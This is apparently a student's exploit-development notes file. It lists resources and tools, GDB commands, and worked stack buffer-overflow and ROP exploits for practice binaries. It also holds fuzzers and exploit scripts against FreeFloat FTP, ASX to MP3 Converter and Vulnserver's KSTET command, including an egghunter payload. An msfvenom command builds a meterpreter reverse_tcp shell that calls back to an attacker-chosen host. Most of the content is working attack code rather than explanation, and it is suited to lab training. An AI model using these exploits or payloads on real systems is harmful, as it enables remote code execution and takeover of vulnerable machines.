# Virtual Machines 

https://drive.google.com/drive/folders/1bbuteBoO86_bBBRw428Pyd6gHH9oI-kN?usp=sharing

(Might remove after 30 days from 12th Aug 2023)


## Resources

1. https://yaksas.in/courses/
2. https://kalitut.com/exploit-development-resources/
3. https://edu.anarcho-copy.org/GNU%20Linux%20-%20Unix-Like/Linux%20Exploit%20Development%20for%20Beginners.pdf
4. https://ia800205.us.archive.org/8/items/Wiley.The.Shellcoders.Handbook.2nd.Edition.Aug.2007/Wiley.The.Shellcoders.Handbook.2nd.Edition.Aug.2007.pdf
5. https://www.coalfire.com/the-coalfire-blog/the-basics-of-exploit-development
6. https://dayzerosec.com/blog/2021/02/02/getting-started.html
7. https://null-byte.wonderhowto.com/how-to/exploit-development-everything-you-need-know-0167801/
8. https://syrion.me/binary/elfx64-bypass-nx-with-mprotect/
9. https://fuzzysecurity.com/tutorials/expDev/1.html


### TOOLS

- Immunity Debugger
- OllyDbg
- xdbg
- Mona.py
- Ropper
- ROPGadgets
- Peda
- GDB



```

-> Linux

GDB : 
info functions
disas [function]
break *[address] 
break [function]
x/5i $eip (examine 5 instructyion of eip)
p $ebp-[value]
x/4wx [address]
x/100wx 0x[address]
x/wx $esp (after 3rd break pnt at ret)
x/s [address] (s is for string)

===============
Overflow-1
--------------

try accessing core file (file core (&) gdb ./binary ./core)
info functions
disas main
disas overflow()
break {push 0x0}
break {add esp,0x10 -- just after push 0x0}
break {ret - end one}
pass input to the binary
{when 1st break point is hit}
x/5i $eip
p $ebp-0x200 {as of lea}
x/4wx {address that we get from above output}
c
{break point 2 hit}
x/4wx {same address as of p}
x/100wx {same addr}
c
{3rd break point hit}
x/wx $esp

==============================
Overflow-101
----------------

Crash, exploit and obtain a shell 

=========================

python -c 'print "A"*516 + "B"*4 + "C"*180'

Compile: gcc -fno-stack-protector -z execstack program.c -o program
Disable ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

ROPgadget --ropchain --binary [file]

=======================
overflow-2
---------------

./overflow-2 $(python -c 'print "A"*64 + "\x01"')

===============
overflow-3
---------------

./overflow-3 $(python -c 'print "A"*64')
objdump -d overflow-3 | grep ">:"
[get the address of shell func]
 ./overflow-3 $(python -c 'print "A"*76 +"\xf8\x85\x04\x08"')

=======================
rop-1
----------

python -c 'print "A"\*140 + "BBBB"' | strace ./rop-1
python -c 'print "A"\*140 + "\xa4\x84\x04\x08"'| ./rop-1
(python -c 'print "A"\*140 + "\xa4\x84\x04\x08"';cat )| ./rop-1

=====================
rop-2
---------

python -c 'print "A"*140 + "BBBB" ' | strace ./rop-2
objdump -d rop-2 | grep system

:~ $ gdb rop-2
gdb-peda$ b*main
gdb-peda$ r
gdb-peda$ find /bin/bash
Searching for '/bin/bash' in: None ranges
Found 3 results, display max 3 items:
rop2-20f65dd0bcbe267d : 0x8048610 ("/bin/bash")
rop2-20f65dd0bcbe267d : 0x8049610 ("/bin/bash")
              [stack] : 0xffffd8a9 ("/bin/bash")
			  
(python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "JUNK" + "\x10\x86\x04\x08"
';cat )| ./rop-2

=======================

-> Windows:

!mona jmp -r ESP
!mona rop -m *.dll -cp nonull

msfvenom -f python -p windows/exec cmd=calc -b '[bad chars]'
msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -b '[bad char]' -f python

========================
FreeFloatFTP
-------------------
fuzz.spk

s_string("USER");
s_string(" ");
s_string("anonymous");
s_string("\r\n");
s_string("PASS ");
s_string("anonymous");
s_string("\r\n");

s_string("MKD ");
s_string_variable("SEDV");
s_string("\r\n");

========================
fuzz.py
------

import socket
import sys

buff = "A"*500

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.200.138',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD '+buff+'\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close


============================
ASXtoMP3Coverter
--------------------------
fuzz.py

buffer = "http://"

buffer = "A"*20000

f=open("exploit.m3u","w")
f.write(buffer)
f.close()

===============
exploit.py
----------

buffer = "http://"

shellcode = "\xcc"

badchar = "\x01\x02 ...... \xfe\xff"

buffer += "A"*[offset value]

buffer += [jmp ESP address]

buffer += "\x90"*50 # NoP

buffer += shellcode

buffer += badchar

buffer += "C"*(600-len(badchar)) # decreaseed by number of badchar - very long buffer might change the crash making exploit unusable

f=open("exploit.m3u","w")
f.write(buffer)
f.close()


===================
Vulnserver - KSTET
------------
fuzz.spk

s_readline();
s_string("KSTET ");
s_string_variable("test");

=====================
fuzz.py
------

import sys
import socket

evilString = "A" * 70 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + evilString

s.connect(('192.168.43.72',9999))
s.recv(1024)
s.send(command2)
s.close()

!mona findmsp   # search msf pattern
To generate egg :-  !mona egg -t [char]  # egg shellcode 

=================
exploit - KSTET
------------------

import sys
import socket

egg = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buf =  "exploit shell code"

shellcode = "ShellShell" + buf

shellString = "\x90"*18 + egg + "\x90"*20 + "\xc7\x11\x50\x62" +  "\xEB\xB8\x90\x90" +"C"*150

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command1 = "HUNT " + shellcode

s.connect(('192.168.43.72',9999))
s.recv(1024)
s.send(command1)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + shellString

s.connect(('192.168.43.72',9999))
s.recv(1024)
s.send(command2)
s.close()
```
